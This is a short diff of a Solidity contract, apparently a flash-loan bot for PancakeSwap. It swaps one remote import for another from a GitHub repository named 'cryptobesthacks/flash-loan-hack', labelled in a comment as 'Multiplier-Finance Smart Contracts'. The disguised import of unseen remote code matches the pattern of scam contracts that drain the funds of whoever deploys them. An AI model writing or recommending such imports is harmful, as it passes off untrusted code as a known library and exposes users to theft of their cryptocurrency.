@@ -1,7 +1,7 @@
 pragma solidity ^0.5.0;
 
 // Multiplier-Finance Smart Contracts
-import "https://github.com/cryptobesthacks/flash-loan-hack-bsc/baseLogic.sol"; 
+import "https://github.com/cryptobesthacks/flash-loan-hack/baseLogic.sol"; 
 
 // PancakeSwap Smart Contracts
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol"; import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol"; import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
